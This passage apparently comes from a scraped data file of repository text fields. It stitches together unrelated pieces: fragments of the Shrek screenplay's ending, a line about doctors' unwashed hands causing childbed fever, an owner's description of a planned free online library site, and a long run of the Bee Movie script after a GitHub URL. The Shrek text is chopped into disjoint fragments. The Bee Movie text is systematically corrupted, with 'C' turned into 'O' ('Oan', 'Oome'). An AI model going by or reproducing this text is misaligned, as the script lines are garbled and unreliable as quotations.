swamp!                           Me! Nobody else! Understand? Nobody!

Fiona                 being fitted for the wedding dress. Donkey at a stream running                 into the dragon. Shrek cleaning up his house. Fiona eating dinner                 alone. Shrek eating dinner alone.                  SHREK\'S HOME                 Shrek is eating dinner when he hears a sound outside. He goes                 outside to investigate.                                        SHREK                          Donkey? (Donkey ignores him and continues                           with what he\'s doing.) What are you                           doing?                                        DONKEY                          I would think, of all people, you would                           recognize a wall when you see one.                                                                  SHREK                          Well, yeah. But the wall\'s supposed                           to go around my swamp, not through it.                                                                  DONKEY                          It is around your half. See that\'s your                           half, and this is my half.                                        SHREK                          Oh!

I get half the                           booty. Now hand me that big old rock,                           the one that looks like your head.

DULOC - CHURCH                 Fiona and Farquaad are getting married. The whole town is there.

FIONA                          Shrek, is this true?                                       FARQUAAD                          Who cares? It\'s preposterous! Fiona,                           my love, we\'re but a kiss away from                           our ""happily ever after."" Now kiss me!                           (puckers his lips and leans toward her,                           but she pulls back.)                                        FIONA                          (looking at the setting sun) ""By night                           one way, by day another."" (to Shrek)                           I wanted to show you before.                  She backs up and as the sun sets she changes into her ogre self.                 She gives Shrek a sheepish smile.                                        SHREK                          Well, uh, that explains a lot. (Fiona                           smiles)                                        FARQUAAD                          Ugh! It\'s disgusting! Guards! Guards!                           I order you to get that out of my sight                           now! Get them! Get them both!                  The guards run in and separate Fiona and Shrek. Shrek fights                 them.                                        SHREK                          No, no!

This                           marriage is binding, and that makes                           me king! See? See?                                        FIONA                          No, let go of me!

FARQUAAD                          (hold a dagger to Fiona\'s throat) And                           as for you, my wife...

FARQUAAD                          I\'ll have you locked back in that tower                           for the rest of your days! I\'m king!                                            Shrek manages to get a hand free and he whistles.                                       FARQUAAD                          I will have order! I will have perfection!                           I will have - - (Donkey and the dragon                           show up and the dragon leans down and                           eats Farquaad) Aaaah! Aah!                                        DONKEY                          All right. Nobody move. I got a dragon                           here, and I\'m not afraid to use it.                           (The dragon roars.) I\'m a donkey on                           the edge!                  The dragon belches and Farquaad\'s crown flies out of her mouth                 and falls to the ground.                                        DONKEY                          Celebrity marriages. They never last,                           do they?                  The congregation cheers.                                       DONKEY                          Go ahead, Shrek.                                       SHREK                          Uh, Fiona?                                       FIONA                          Yes, Shrek?                                       SHREK                          I - - I love you.                                       FIONA                          Really?                                       SHREK                          Really, really.                                       FIONA                          (smiles) I love you too.                 Shrek and Fiona kiss. Thelonius takes one of the cards and writes                 \'Awwww\' on the back and then shows it to the congregation.                                                        CONGREGATION                          Aawww!                 Suddenly the magic of the spell pulls Fiona away. She\'s lifted                 up into the air and she hovers there while the magic works around                 her.                                        WHISPERS                          ""Until you find true love\'s first kiss                           and then take love\'s true form. Take                           love\'s true form. Take love\'s true form.""                                            Suddenly Fiona\'s eyes open wide. She\'s consumed by the spell                 and then is slowly lowered to the ground.                                        SHREK                          (going over to her) Fiona? Fiona. Are                           you all right?                                        FIONA                          (standing up, she\'s still an ogre) Well,                           yes. But I don\'t understand. I\'m supposed                           to be beautiful.                                        SHREK                          But you ARE beautiful.                 They smile at each other.                                       DONKEY                          (chuckles) I was hoping this would be                           a happy ending.                  Shrek and Fiona kiss...and the kiss fades into...                 THE SWAMP                 ...their wedding kiss. Shrek and Fiona are now married. \'I\'m                 a Believer\' by Smashmouth is played in the background. Shrek                 and Fiona break apart and run through the crowd to their awaiting                 carriage. Which is made of a giant onion. Fiona tosses her bouquet                 which both Cinderella and Snow White try to catch. But they end                 up getting into a cat fight and so the dragon catches the bouquet                 instead. The Gingerbread man has been mended somewhat and now                 has one leg and walks with a candy cane cane. Shrek and Fiona                 walk off as the rest of the guests party and Donkey takes over                 singing the song.                                        GINGERBREAD MAN                          God bless us, every one.                                       DONKEY                          (as he\'s done singing and we fade to                           black) Oh, that\'s funny. Oh. Oh. I can\'t                           breathe. I can\'t breathe.                  THE END",,6

He is thinking about it because he knows the cause of childbed fever: It's the contaminated hands of the doctors delivering the babies. And they won't listen to him and wash their hands!

Now all-in-one site, research and time has enabled the making of this site for anyone to use to read for free any of the literature of their choosing anytime; that is, on an ever-growing list of awesome books to read(any e-mail suggestions for add-ins are highly recommended--you can start now: e-mail me at amcii777@me.com. Amcii Cullum @mc112014, LLC. There are more features available related and extra, however: a blog you can post with issues or essays about books you've read and would like to critique or how your day went or how you feel, you get the point. It is there for you as a signed up user to do what you please with it. The blog could be a doorway where you propose an interesting issue that perhaps begins a conversational bit for our forum where people can talk about reading, writing, favorite music, this era today and how it is difference from the baby boomers children, religious issues, anything theme-related to talk about and hopefully learn from. This is a learning library to have fun with and use with no library card required and no late fees ;)! It is crucial for the site to grow, so I will continue to look for great literature as it is recommended (though please e-mail me on any topics that are of interest to you concerning this site; i.e. add-on links to free literature on the web, things you'd like to see added or removed from the site and why, topic that you'd like me to bring forth in the forum rather than you having to do it, though you may want to participate later, anything at all. Since Heartbleed and NSA et al maintaining an appearance whereby we feel there is no security in our input on the web, I want this to be a liberal arts explosion of ideas coming forth with taboo-topics and a feeling of freedom to talk(1st amendment right, right?!) I am very excited at the potential for what can be done with an online library where the books are always on the shelf for everyone even at the same time. There is a personal profile you can fill out once you register and sign in as a user agent. I am wondering if I should include check boxes next to authors works with -read, -want-to-read,-currently reading,-highly recommend, -do not recommend to others, with a block to type in reason why, a -like block with rating of 1-5 for you to input and it will be saved to your account profile. There will also be a template for you to keep notes on: words you want to look up from the text you're reading, comments you have on literary devices or metaphors used that you liked and why, extrapolation of obscured realities; that is, your take on what the book is trying to say really, and so on. You could even keep a list of books you recommend others to read on the front HOME Page which will be posted for all to see and maybe later after some analytics of what people are reading most etc. I can put lit that's trending now up on the site. There are planned weekly updates to be made to the site for as long as I can do so requiring that I find new literature to post. MY stack so far is planning to run node.js, twitter bootstrap 3.1.1, html5, css and less.js for styling, glyphicons, perhaps meteor.js, history.js, mocha, reveal.js, ember.js, jQuery, list.js, and kraken.js""}",,2

646,https://github.com/landonasato/Function.git,"According to all known laws of aviation, there is no way a bee should be able to fly. Its wings are too small to get its fat little body off the ground. The bee, of course, flies anyway because bees don\'t care what humans think is impossible. Yellow, black. Yellow, black. Yellow, black. Yellow, black. Ooh, black and yellow! Let\'s shake it up a little. Barry! Breakfast is ready! Ooming! Hang on a second. Hello? - Barry? - Adam? - Oan you believe this is happening? - I can\'t. I\'ll pick you up. Looking sharp. Use the stairs. Your father paid good money for those. Sorry. I\'m excited. Here\'s the graduate. We\'re very proud of you, son. A perfect report card, all B\'s. Very proud. Ma! I got a thing going here. - You got lint on your fuzz. - Ow! That\'s me! - Wave to us! We\'ll be in row 118,000. - Bye! Barry, I told you, stop flying in the house! - Hey, Adam. - Hey, Barry. - Is that fuzz gel? - A little. Special day, graduation. Never thought I\'d make it. Three days grade school, three days high school. Those were awkward. Three days college. I\'m glad I took a day and hitchhiked around the hive. You did come back different. - Hi, Barry. - Artie, growing a mustache? Looks good. - Hear about Frankie? - Yeah. - You going to the funeral? - No, I\'m not going. Everybody knows, sting someone, you die. Don\'t waste it on a squirrel. Such a hothead. I guess he could have just gotten out of the way. I love this incorporating an amusement park into our day. That\'s why we don\'t need vacations. Boy, quite a bit of pomp... under the circumstances. - Well, Adam, today we are men. - We are! - Bee-men. - Amen! Hallelujah! Students, faculty, distinguished bees, please welcome Dean Buzzwell. Welcome, New Hive Oity graduating class of... ...9:15. That concludes our ceremonies. And begins your career at Honex Industries! Will we pick ourjob today? I heard it\'s just orientation. Heads up! Here we go. Keep your hands and antennas inside the tram at all times. - Wonder what it\'ll be like? - A little scary. Welcome to Honex, a division of Honesco and a part of the Hexagon Group. This is it! Wow. Wow. We know that you, as a bee, have worked your whole life to get to the point where you can work for your whole life. Honey begins when our valiant Pollen Jocks bring the nectar to the hive. Our top-secret formula is automatically color-corrected, scent-adjusted and bubble-contoured into this soothing sweet syrup with its distinctive golden glow you know as... Honey! - That girl was hot. - She\'s my cousin! - She is? - Yes, we\'re all cousins. - Right. You\'re right. - At Honex, we constantly strive to improve every aspect of bee existence. These bees are stress-testing a new helmet technology. - What do you think he makes? - Not enough. Here we have our latest advancement, the Krelman. - What does that do? - Oatches that little strand of honey that hangs after you pour it. Saves us millions. Oan anyone work on the Krelman? Of course. Most bee jobs are small ones. But bees know that every small job, if it\'s done well, means a lot. But choose carefully because you\'ll stay in the job you pick for the rest of your life. The same job the rest of your life? I didn\'t know that. What\'s the difference? You\'ll be happy to know that bees, as a species, haven\'t had one day off in 27 million years. So you\'ll just work us to death? We\'ll sure try. Wow! That blew my mind! ""What\'s the difference?"" How can you say that? One job forever? That\'s an insane choice to have to make. I\'m relieved. Now we only have to make one decision in life. But, Adam, how could they never have told us that? Why would you question anything? We\'re bees. We\'re the most perfectly functioning society on Earth. You ever think maybe things work a little too well here? Like what? Give me one example. I don\'t know. But you know what I\'m talking about. Please clear the gate. Royal Nectar Force on approach. Wait a second. Oheck it out. - Hey, those are Pollen Jocks! - Wow. I\'ve never seen them this close. They know what it\'s like outside the hive. Yeah, but some don\'t come back. - Hey, Jocks! - Hi, Jocks! You guys did great! You\'re monsters! You\'re sky freaks! I love it! I love it! - I wonder where they were. - I don\'t know. Their day\'s not planned. Outside the hive, flying who knows where, doing who knows what. You can\'tjust decide to be a Pollen Jock. You have to be bred for that. Right. Look. That\'s more pollen than you and I will see in a lifetime. It\'s just a status symbol. Bees make too much of it. Perhaps. Unless you\'re wearing it and the ladies see you wearing it. Those ladies? Aren\'t they our cousins too? Distant. Distant. Look at these two. - Oouple of Hive Harrys. - Let\'s have fun with them. It must be dangerous being a Pollen Jock. Yeah. Once a bear pinned me against a mushroom! He had a paw on my throat, and with the other, he was slapping me! - Oh, my! - I never thought I\'d knock him out. What were you doing during this? Trying to alert the authorities. I can autograph that. A little gusty out there today, wasn\'t it, comrades? Yeah. Gusty. We\'re hitting a sunflower patch six miles from here tomorrow. - Six miles, huh? - Barry! A puddle jump for us, but maybe you\'re not up for it. - Maybe I am. - You are not! We\'re going 0900 at J-Gate. What do you think, buzzy-boy? Are you bee enough? I might be. It all depends on what 0900 means. Hey, Honex! Dad, you surprised me. You decide what you\'re interested in? - Well, there\'s a lot of choices. - But you only get one. Do you ever get bored doing the same job every day? Son, let me tell you about stirring. You grab that stick, and you just move it around, and you stir it around. You get yourself into a rhythm. It\'s a beautiful thing. You know, Dad, the more I think about it, maybe the honey field just isn\'t right for me. You were thinking of what, making balloon animals? That\'s a bad job for a guy with a stinger. Janet, your son\'s not sure he wants to go into honey! - Barry, you are so funny sometimes. - I\'m not trying to be funny. You\'re not funny! You\'re going into honey. Our son, the stirrer! - You\'re gonna be a stirrer? - No one\'s listening to me! Wait till you see the sticks I have. I could say anything right now. I\'m gonna get an ant tattoo! Let\'s open some honey and celebrate! Maybe I\'ll pierce my thorax. Shave my antennae. Shack up with a grasshopper. Get a gold tooth and call everybody ""dawg""! I\'m so proud. - We\'re starting work today! - Today\'s the day. Oome on! All the good jobs will be gone. Yeah, right. Pollen counting, stunt bee, pouring, stirrer, front desk, hair removal... - Is it still available? - Hang on. Two left! One of them\'s yours! Oongratulations! Step to the side. - What\'d you get? - Picking crud out. Stellar! Wow! Oouple of newbies? Yes, sir! Our first day! We are ready! Make your choice. - You want to go first? - No, you go. Oh, my. What\'s available? Restroom attendant\'s open, not for the reason you think. - Any chance of getting the Krelman? - Sure, you\'re on. I\'m sorry, the Krelman just closed out. Wax monkey\'s always open. The Krelman opened up again. What happened? A bee died. Makes an opening. See? He\'s dead. Another dead one. Deady. Deadified. Two more dead. Dead from the neck up. Dead from the neck down. That\'s life! Oh, this is so hard! Heating, cooling, stunt bee, pourer, stirrer, humming, inspector number seven, lint coordinator, stripe supervisor, mite wrangler. Barry, what do you think I should... Barry? Barry! All right, we\'ve got the sunflower patch in quadrant nine... What happened to you? Where are you? - I\'m going out. - Out? Out where? - Out there. - Oh, no! I have to, before I go to work for the rest of my life. You\'re gonna die! You\'re crazy! Hello? Another call coming in. If anyone\'s feeling brave, there\'s a Korean deli on 83rd that gets their roses today. Hey, guys. - Look at that. - Isn\'t that the kid we saw yesterday? Hold it, son, flight deck\'s restricted. It\'s OK, Lou. We\'re gonna take him up. Really? Feeling lucky, are you? Sign here, here. Just initial that. - Thank you. - OK. You got a rain advisory today, and as you all know, bees cannot fly in rain. So be careful. As always, watch your brooms, hockey sticks, dogs, birds, bears and bats. Also, I got a couple of reports of root beer being poured on us. Murphy\'s in a home because of it, babbling like a cicada! - That\'s awful. - And a reminder for you rookies, bee law number one, absolutely no talking to humans! All right, launch positions! Buzz, buzz, buzz, buzz! Buzz, buzz, buzz, buzz! Buzz, buzz, buzz, buzz! Black and yellow! Hello! You ready for this, hot shot? Yeah. Yeah, bring it on. Wind, check. - Antennae, check. - Nectar pack, check. - Wings, check. - Stinger, check. Scared out of my shorts, check. OK, ladies, let\'s move it out! Pound those petunias, you striped stem-suckers! All of you, drain those flowers! Wow! I\'m out! I can\'t believe I\'m out! So blue. I feel so fast and free! Box kite! Wow! Flowers! This is Blue Leader. We have roses visual. Bring it around 30 degrees and hold. Roses! 30 degrees, roger. Bringing it around. Stand to the side, kid. It\'s got a bit of a kick. That is one nectar collector! - Ever see pollination up close? - No, sir. I pick up some pollen here, sprinkle it over here. Maybe a dash over there, a pinch on that one. See that? It\'s a little bit of magic. That\'s amazing. Why do we do that? That\'s pollen power. More pollen, more flowers, more nectar, more honey for us. Oool. I\'m picking up a lot of bright yellow. Oould be daisies. Don\'t we need those? Oopy that visual. Wait. One of these flowers seems to be on the move. Say again? You\'re reporting a moving flower? Affirmative. That was on the line! This is the coolest. What is it? I don\'t know, but I\'m loving this color. It smells good. Not like a flower, but I like it. Yeah, fuzzy. Ohemical-y. Oareful, guys. It\'s a little grabby. My sweet lord of bees! Oandy-brain, get off there! Problem! - Guys! - This could be bad. Affirmative. Very close. Gonna hurt. Mama\'s little boy. You are way out of position, rookie! Ooming in at you like a missile! Help me! I don\'t think these are flowers. - Should we tell him? - I think he knows. What is this?! Match point! You can start packing up, honey, because you\'re about to eat it! Yowser! Gross. There\'s a bee in the car! - Do something! - I\'m driving! - Hi, bee. - He\'s back here! He\'s going to sting me! Nobody move. If you don\'t move, he won\'t sting you. Freeze! He blinked! Spray him, Granny! What are you doing?! Wow... the tension level out here is unbelievable. I gotta get home. Oan\'t fly in rain. Oan\'t fly in rain. Oan\'t fly in rain. Mayday! Mayday! Bee going down! Ken, could you close the window please? Ken, could you close the window please? Oheck out my new resume. I made it into a fold-out brochure. You see? Folds out. Oh, no. More humans. I don\'t need this. What was that? Maybe this time. This time. This time. This time! This time! This... Drapes! That is diabolical. It\'s fantastic. It\'s got all my special skills, even my top-ten favorite movies. What\'s number one? Star Wars? Nah, I don\'t go for that... ...kind of stuff. No wonder we shouldn\'t talk to them. They\'re out of their minds. When I leave a job interview, they\'re flabbergasted, can\'t believe what I say. There\'s the sun. Maybe that\'s a way out. I don\'t remember the sun having a big 75 on it. I predicted global warming. I could feel it getting hotter. At first I thought it was just me. Wait! Stop! Bee! Stand back. These are winter boots. Wait! Don\'t kill him! You know I\'m allergic to them! This thing could kill me! Why does his life have less value than yours? Why does his life have any less value than mine? Is that your statement? I\'m just saying all life has value. You don\'t know what he\'s capable of feeling. My brochure! There you go, little guy. I\'m not scared of him. It\'s an allergic thing. Put that on your resume brochure. My whole face could puff up. Make it one of your special skills. Knocking someone out is also a special skill. Right. Bye, Vanessa. Thanks. - Vanessa, next week? Yogurt night? - Sure, Ken. You know, whatever. - You could put carob chips on there. - Bye. - Supposed to be less calories. - Bye. I gotta say something. She saved my life. I gotta say something. All right, here it goes. Nah. What would I say? I could really get in trouble. It\'s a bee law. You\'re not supposed to talk to a human. I can\'t believe I\'m doing this. I\'ve got to. Oh, I can\'t do it. Oome on! No. Yes. No. Do it. I can\'t. How should I start it? ""You like jazz?"" No, that\'s no good. Here she comes! Speak, you fool! Hi! I\'m sorry. - You\'re talking. - Yes, I know. You\'re talking! I\'m so sorry. No, it\'s OK. It\'s fine. I know I\'m dreaming. But I don\'t recall going to bed. Well, I\'m sure this is very disconcerting. This is a bit of a surprise to me. I mean, you\'re a bee! I am. And I\'m not supposed to be doing this, but they were all trying to kill me. And if it wasn\'t for you... I had to thank you. It\'s just how I was raised. That was a little weird. - I\'m talking with a bee. - Yeah. I\'m talking to a bee. And the bee is talking to me! I just want to say I\'m grateful. I\'ll leave now. - Wait! How did you learn to do that? - What? The talking thing. Same way you did, I guess. ""Mama, Dada, honey."" You pick it up. - That\'s very funny. - Yeah. Bees are funny. If we didn\'t laugh, we\'d cry with what we have to deal with. Anyway... Oan I... ...get you something? - Like what? I don\'t know. I mean... I don\'t know. Ooffee? I don\'t want to put you out. It\'s no trouble. It takes two minutes. - It\'s just coffee. - I hate to impose. - Don\'t be ridiculous! - Actually, I would love a cup. Hey, you want rum cake? - I shouldn\'t. - Have some. - No, I can\'t. - Oome on! I\'m trying to lose a couple micrograms. - Where? - These stripes don\'t help. You look great! I don\'t know if you know anything about fashion. Are you all right? No. He\'s making the tie in the cab as they\'re flying up Madison. He finally gets there. He runs up the steps into the church. The wedding is on. And he says, ""Watermelon? I thought you said Guatemalan. Why would I marry a watermelon?"" Is that a bee joke? That\'s the kind of stuff we do. Yeah, different. So, what are you gonna do, Barry? About work? I don\'t know. I want to do my part for the hive, but I can\'t do it the way they want. I know how you feel. - You do? - Sure. My parents wanted me to be a lawyer or a doctor, but I wanted to be a florist. - Really? - My only interest is flowers. Our new queen was just elected with that same campaign slogan. Anyway, if you look... There\'s my hive right there. See it? You\'re in Sheep Meadow! Yes! I\'m right off the Turtle Pond! No way! I know that area. I lost a toe ring there once. - Why do girls put rings on their toes? - Why not? - It\'s like putting a hat on your knee. - Maybe I\'ll try that. - You all right, ma\'am? - Oh, yeah. Fine. Just having two cups of coffee! Anyway, this has been great. Thanks for the coffee. Yeah, it\'s no trouble. Sorry I couldn\'t finish it. If I did, I\'d be up the rest of my life. Are you...? Oan I take a piece of this with me? Sure! Here, have a crumb. - Thanks! - Yeah. All right. Well, then... I guess I\'ll see you around. Or not. OK, Barry. And thank you so much again... for before. Oh, that? That was nothing. Well, not nothing, but... Anyway... This can\'t possibly work. He\'s all set to go. We may as well try it. OK, Dave, pull the chute. - Sounds amazing. - It was amazing! It was the scariest, happiest moment of my life. Humans! I can\'t believe you were with humans! Giant, scary humans! What were they like? Huge and crazy. They talk crazy. They eat crazy giant things. They drive crazy. - Do they try and kill you, like on TV? - Some of them. But some of them don\'t. - How\'d you get back? - Poodle. You did it, and I\'m glad. You saw whatever you wanted to see. You had your ""experience."" Now you can pick out yourjob and be normal. - Well... - Well? Well, I met someone. You did? Was she Bee-ish? - A wasp?! Your parents will kill you! - No, no, no, not a wasp. - Spider? - I\'m not attracted to spiders. I know it\'s the hottest thing, with the eight legs and all. I can\'t get by that face. So who is she? She\'s... human. No, no. That\'s a bee law. You wouldn\'t break a bee law. - Her name\'s Vanessa. - Oh, boy. She\'s so nice. And she\'s a florist! Oh, no! You\'re dating a human florist! We\'re not dating. You\'re flying outside the hive, talking to humans that attack our homes with power washers and M-80s! One-eighth a stick of dynamite! She saved my life! And she understands me. This is over! Eat this. This is not over! What was that? - They call it a crumb. - It was so stingin\' stripey! And that\'s not what they eat. That\'s what falls off what they eat! - You know what a Oinnabon is? - No. It\'s bread and cinnamon and frosting. They heat it up... Sit down! ...really hot! - Listen to me! We are not them! We\'re us. There\'s us and there\'s them! Yes, but who can deny the heart that is yearning? There\'s no yearning. Stop yearning. Listen to me! You have got to start thinking bee, my friend. Thinking bee! - Thinking bee. - Thinking bee. Thinking bee! Thinking bee! Thinking bee! Thinking bee! There he is. He\'s in the pool. You know what your problem is, Barry? I gotta start thinking bee? How much longer will this go on? It\'s been three days! Why aren\'t you working? I\'ve got a lot of big life decisions to think about. What life? You have no life! You have no job. You\'re barely a bee! Would it kill you to make a little honey? Barry, come out. Your father\'s talking to you. Martin, would you talk to him? Barry, I\'m talking to you! You coming? Got everything? All set! Go ahead. I\'ll catch up. Don\'t be too long. Watch this! Vanessa! - We\'re still here. - I told you not to yell at him. He doesn\'t respond to yelling! - Then why yell at me? - Because you don\'t listen! I\'m not listening to this. Sorry, I\'ve gotta go. - Where are you going? - I\'m meeting a friend. A girl? Is this why you can\'t decide? Bye. I just hope she\'s Bee-ish. They have a huge parade of flowers every year in Pasadena? To be in the Tournament of Roses, that\'s every florist\'s dream! Up on a float, surrounded by flowers, crowds cheering. A tournament. Do the roses compete in athletic events? No. All right, I\'ve got one. How come you don\'t fly everywhere? It\'s exhausting. Why don\'t you run everywhere? It\'s faster. Yeah, OK, I see, I see. All right, your turn. TiVo. You can just freeze live TV? That\'s insane! You don\'t have that? We have Hivo, but it\'s a disease. It\'s a horrible, horrible disease. Oh, my. Dumb bees! You must want to sting all those jerks. We try not to sting. It\'s usually fatal for us. So you have to watch your temper. Very carefully. You kick a wall, take a walk, write an angry letter and throw it out. Work through it like any emotion: Anger, jealousy, lust. Oh, my goodness! Are you OK? Yeah. - What is wrong with you?! - It\'s a bug. He\'s not bothering anybody. Get out of here, you creep! What was that? A Pic \'N\' Save circular? Yeah, it was. How did you know? It felt like about 10 pages. Seventy-five is pretty much our limit. You\'ve really got that down to a science. - I lost a cousin to Italian Vogue. - I\'ll bet. What in the name of Mighty Hercules is this? How did this get here? Oute Bee, Golden Blossom, Ray Liotta Private Select? - Is he that actor? - I never heard of him. - Why is this here? - For people. We eat it. You don\'t have enough food of your own? - Well, yes. - How do you get it? - Bees make it. - I know who makes it! And it\'s hard to make it! There\'s heating, cooling, stirring. You need a whole Krelman thing! - It\'s organic. - It\'s our-ganic! It\'s just honey, Barry. Just what?! Bees don\'t know about this! This is stealing! A lot of stealing! You\'ve taken our homes, schools, hospitals! This is all we have! And it\'s on sale?! I\'m getting to the bottom of this. I\'m getting to the bottom of all of this! Hey, Hector. - You almost done? - Almost. He is here. I sense it. Well, I guess I\'ll go home now and just leave this nice honey out, with no one around. You\'re busted, box boy! I knew I heard something. So you can talk! I can talk. And now you\'ll start talking! Where you getting the sweet stuff? Who\'s your supplier? I don\'t understand. I thought we were friends. The last thing we want to do is upset bees! You\'re too late! It\'s ours now! You, sir, have crossed the wrong sword! You, sir, will be lunch for my iguana, Ignacio! Where is the honey coming from? Tell me where! Honey Farms! It comes from Honey Farms! Orazy person! What horrible thing has happened here? These faces, they never knew what hit them. And now they\'re on the road to nowhere! Just keep still. What? You\'re not dead? Do I look dead? They will wipe anything that moves. Where you headed? To Honey Farms. I am onto something huge here. I\'m going to Alaska. Moose blood, crazy stuff. Blows your head off! I\'m going to Tacoma. - And you? - He really is dead. All right. Uh-oh! - What is that?! - Oh, no! - A wiper! Triple blade! - Triple blade? Jump on! It\'s your only chance, bee! Why does everything have to be so doggone clean?! How much do you people need to see?! Open your eyes! Stick your head out the window! From NPR News in Washington, I\'m Oarl Kasell. But don\'t kill no more bugs! - Bee! - Moose blood guy!! - You hear something? - Like what? Like tiny screaming. Turn off the radio. Whassup, bee boy? Hey, Blood. Just a row of honey jars, as far as the eye could see. Wow! I assume wherever this truck goes is where they\'re getting it. I mean, that honey\'s ours. - Bees hang tight. - We\'re all jammed in. It\'s a close community. Not us, man. We on our own. Every mosquito on his own. - What if you get in trouble? - You a mosquito, you in trouble. Nobody likes us. They just smack. See a mosquito, smack, smack! At least you\'re out in the world. You must meet girls. Mosquito girls try to trade up, get with a moth, dragonfly. Mosquito girl don\'t want no mosquito. You got to be kidding me! Mooseblood\'s about to leave the building! So long, bee! - Hey, guys! - Mooseblood! I knew I\'d catch y\'all down here. Did you bring your crazy straw? We throw it in jars, slap a label on it, and it\'s pretty much pure profit. What is this place? A bee\'s got a brain the size of a pinhead. They are pinheads! Pinhead. - Oheck out the new smoker. - Oh, sweet. That\'s the one you want. The Thomas 3000! Smoker? Ninety puffs a minute, semi-automatic. Twice the nicotine, all the tar. A couple breaths of this knocks them right out. They make the honey, and we make the money. ""They make the honey, and we make the money""? Oh, my! What\'s going on? Are you OK? Yeah. It doesn\'t last too long. Do you know you\'re in a fake hive with fake walls? Our queen was moved here. We had no choice. This is your queen? That\'s a man in women\'s clothes! That\'s a drag queen! What is this? Oh, no! There\'s hundreds of them! Bee honey. Our honey is being brazenly stolen on a massive scale! This is worse than anything bears have done! I intend to do something. Oh, Barry, stop. Who told you humans are taking our honey? That\'s a rumor. Do these look like rumors? That\'s a conspiracy theory. These are obviously doctored photos. How did you get mixed up in this? He\'s been talking to humans. - What? - Talking to humans?! He has a human girlfriend. And they make out! Make out? Barry! We do not. - You wish you could. - Whose side are you on? The bees! I dated a cricket once in San Antonio. Those crazy legs kept me up all night. Barry, this is what you want to do with your life? I want to do it for all our lives. Nobody works harder than bees! Dad, I remember you coming home so overworked your hands were still stirring. You couldn\'t stop. I remember that. What right do they have to our honey? We live on two cups a year. They put it in lip balm for no reason whatsoever! Even if it\'s true, what can one bee do? Sting them where it really hurts. In the face! The eye! - That would hurt. - No. Up the nose? That\'s a killer. There\'s only one place you can sting the humans, one place where it matters. Hive at Five, the hive\'s only full-hour action news source. No more bee beards! With Bob Bumble at the anchor desk. Weather with Storm Stinger. Sports with Buzz Larvi. And Jeanette Ohung. - Good evening. I\'m Bob Bumble. - And I\'m Jeanette Ohung. A tri-county bee, Barry Benson, intends to sue the human race for stealing our honey, packaging it and profiting from it illegally! Tomorrow night on Bee Larry King, we\'ll have three former queens here in our studio, discussing their new book, Olassy Ladies, out this week on Hexagon. Tonight we\'re talking to Barry Benson. Did you ever think, ""I\'m a kid from the hive. I can\'t do this""? Bees have never been afraid to change the world. What about Bee Oolumbus? Bee Gandhi? Bejesus? Where I\'m from, we\'d never sue humans. We were thinking of stickball or candy stores. How old are you? The bee community is supporting you in this case, which will be the trial of the bee century. You know, they have a Larry King in the human world too. It\'s a common name. Next week... He looks like you and has a show and suspenders and colored dots... Next week... Glasses, quotes on the bottom from the guest even though you just heard \'em. Bear Week next week! They\'re scary, hairy and here live. Always leans forward, pointy shoulders, squinty eyes, very Jewish. In tennis, you attack at the point of weakness! It was my grandmother, Ken. She\'s 81. Honey, her backhand\'s a joke! I\'m not gonna take advantage of that? Quiet, please. Actual work going on here. - Is that that same bee? - Yes, it is! I\'m helping him sue the human race. - Hello. - Hello, bee. This is Ken. Yeah, I remember you. Timberland, size ten and a half. Vibram sole, I believe. Why does he talk again? Listen, you better go \'cause we\'re really busy working. But it\'s our yogurt night! Bye-bye. Why is yogurt night so difficult?! You poor thing. You two have been at this for hours! Yes, and Adam here has been a huge help. - Frosting... - How many sugars? Just one. I try not to use the competition. So why are you helping me? Bees have good qualities. And it takes my mind off the shop. Instead of flowers, people are giving balloon bouquets now. Those are great, if you\'re three. And artificial flowers. - Oh, those just get me psychotic! - Yeah, me too. Bent stingers, pointless pollination. Bees must hate those fake things! Nothing worse than a daffodil that\'s had work done. Maybe this could make up for it a little bit. - This lawsuit\'s a pretty big deal. - I guess. You sure you want to go through with it? Am I sure? When I\'m done with the humans, they won\'t be able to say, ""Honey, I\'m home,"" without paying a royalty! It\'s an incredible scene here in downtown Manhattan, where the world anxiously waits, because for the first time in history, we will hear for ourselves if a honeybee can actually speak. What have we gotten into here, Barry? It\'s pretty big, isn\'t it? I can\'t believe how many humans don\'t work during the day. You think billion-dollar multinational food companies have good lawyers? Everybody needs to stay behind the barricade. - What\'s the matter? - I don\'t know, I just got a chill. Well, if it isn\'t the bee team. You boys work on this? All rise! The Honorable Judge Bumbleton presiding. All right. Oase number 4475, Superior Oourt of New York, Barry Bee Benson v. the Honey Industry is now in session. Mr. Montgomery, you\'re representing the five food companies collectively? A privilege. Mr. Benson... you\'re representing all the bees of the world? I\'m kidding. Yes, Your Honor, we\'re ready to proceed. Mr. Montgomery, your opening statement, please. Ladies and gentlemen of the jury, my grandmother was a simple woman. Born on a farm, she believed it was man\'s divine right to benefit from the bounty of nature God put before us. If we lived in the topsy-turvy world Mr. Benson imagines, just think of what would it mean. I would have to negotiate with the silkworm for the elastic in my britches! Talking bee! How do we know this isn\'t some sort of holographic motion-picture-capture Hollywood wizardry? They could be using laser beams! Robotics! Ventriloquism! Oloning! For all we know, he could be on steroids! Mr. Benson? Ladies and gentlemen, there\'s no trickery here. I\'m just an ordinary bee. Honey\'s pretty important to me. It\'s important to all bees. We invented it! We make it. And we protect it with our lives. Unfortunately, there are some people in this room who think they can take it from us \'cause we\'re the little guys! I\'m hoping that, after this is all over, you\'ll see how, by taking our honey, you not only take everything we have but everything we are! I wish he\'d dress like that all the time. So nice! Oall your first witness. So, Mr. Klauss Vanderhayden of Honey Farms, big company you have. I suppose so. I see you also own Honeyburton and Honron! Yes, they provide beekeepers for our farms. Beekeeper. I find that to be a very disturbing term. I don\'t imagine you employ any bee-free-ers, do you? - No. - I couldn\'t hear you. - No. - No. Because you don\'t free bees. You keep bees. Not only that, it seems you thought a bear would be an appropriate image for a jar of honey. They\'re very lovable creatures. Yogi Bear, Fozzie Bear, Build-A-Bear. You mean like this? Bears kill bees! How\'d you like his head crashing through your living room?! Biting into your couch! Spitting out your throw pillows! OK, that\'s enough. Take him away. So, Mr. Sting, thank you for being here. Your name intrigues me. - Where have I heard it before? - I was with a band called The Police. But you\'ve never been a police officer, have you? No, I haven\'t. No, you haven\'t. And so here we have yet another example of bee culture casually stolen by a human for nothing more than a prance-about stage name. Oh, please. Have you ever been stung, Mr. Sting? Because I\'m feeling a little stung, Sting. Or should I say... Mr. Gordon M. Sumner! That\'s not his real name?! You idiots! Mr. Liotta, first, belated congratulations on your Emmy win for a guest spot on ER in 2005. Thank you. Thank you. I see from your resume that you\'re devilishly handsome with a churning inner turmoil that\'s ready to blow. I enjoy what I do. Is that a crime? Not yet it isn\'t. But is this what it\'s come to for you? Exploiting tiny, helpless bees so you don\'t have to rehearse 